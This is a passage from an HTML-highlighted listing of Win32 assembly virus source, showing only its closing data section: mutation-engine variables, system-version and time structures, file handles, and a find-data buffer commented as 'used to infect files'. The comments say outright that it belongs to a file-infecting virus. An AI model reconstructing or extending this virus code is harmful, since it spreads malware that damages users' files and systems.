</span><span class="sc5">fake_oper_size</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;...and fake one</span><span class="sc0">

</span><span class="sc5">index_mask</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Mask of register used as index</span><span class="sc0">
</span><span class="sc5">fake_index_mask</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;...and fake one</span><span class="sc0">

</span><span class="sc5">NUM_DA</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">NumberOfDataAreas</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">tbl_data_area</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">NUM_DA</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Structure used by GetVersionEx</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">system_version</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwMajorVersion</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwMinorVersion</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwBuildNumber</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwPlatformId</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">szCSDVersion</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;SYSTEMTIME structure used by GetLocalTime</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">local_time</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">LT_Year</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Month</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_DayOfWeek</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Day</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Hour</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Minute</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Second</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">LT_Milliseconds</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Information about currently opened file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CurFileAttr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">h_CreateFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">h_FileMap</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">h_Key</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This is a WIN32 FindData structure used to infect files</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">h_Find</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">DirectFindData</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Used to retrieve current, windows and system directories</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">BufGetDir</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;End of virus image in allocated memory</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">alloc_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">viro_sys</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host_code</span><span class="sc0">
</span></div></body>
</html>
